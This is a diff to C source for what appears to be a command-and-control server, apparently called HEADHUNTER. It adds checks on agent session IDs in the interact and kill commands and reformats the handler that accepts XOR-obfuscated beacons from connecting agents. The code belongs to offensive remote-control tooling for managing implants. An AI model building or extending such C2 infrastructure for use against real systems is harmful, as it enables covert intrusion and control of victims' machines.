@@ -69,12 +69,15 @@ int server_control_session(){
 
 	    char* value = split(buffer, " ");
 	    int selected_value = atoi(value);
-
             selected_id += selected_value;
-                
-            if (selected_id < 0) {
+	    
+            if (selected_id < 1) {
                 printf("\e[1;31m[-]\e[0m Invalid id!\n\n");
-            } else {
+            }
+	    else if(client_socket[selected_id-1] == 0){
+                printf("\e[1;31m[-]\e[0m No agent tied to ID\n\n");
+	    } 
+	    else {
                 printf("\e[1;32m[+]\e[0m Entering agent control session with session ID: %d...\n", selected_id);
                 printf("Type \"bg\" to background agent control session\n");
 		
@@ -87,19 +90,23 @@ int server_control_session(){
                 selected_id += 3;
                 return selected_id;
             }
-    	}
+   	}
         else if (str_starts_with(buffer, "kill") == 0){
 		
 		selected_id = 0;
-
 	    	char* value = split(buffer, " ");
 		int selected_value = atoi(value);
 		
 		selected_id += selected_value;
+		
 
-		if (selected_id < 0){
+		if (selected_id < 1){
 			printf("\e[1;31m[-]\e[0m Invalid id!\n\n");
-		} else{
+		} 
+		else if(client_socket[selected_id-1] == 0){
+                	printf("\e[1;31m[-]\e[0m No agent tied to ID\n\n");
+            	} 
+		else{
 			printf("\e[1;32m[+]\e[0m Killing agent control session with session ID: %d...\n", selected_id);
 			selected_id += 3;
 			for(int i = 0; i < max_clients; i++){
@@ -342,8 +349,8 @@ void *Acceptor(){
                     if( client_socket[i] == 0 ){
 			
 			char beacon[MAXBUF];
-            char* response = "--HEADHUNTER NO--";
-            char* xorresponse = XOR(response, key, strlen(response), keylen);
+            		char* response = "--HEADHUNTER NO--";
+            		char* xorresponse = XOR(response, key, strlen(response), keylen);
 			int n = recv(new_socket, beacon, MAXBUF, 0);
 			char* xorbeacon = XOR(beacon, key, n, keylen);
 			if(str_starts_with(xorbeacon, "--HEADHUNTER BEACON--") == 0){
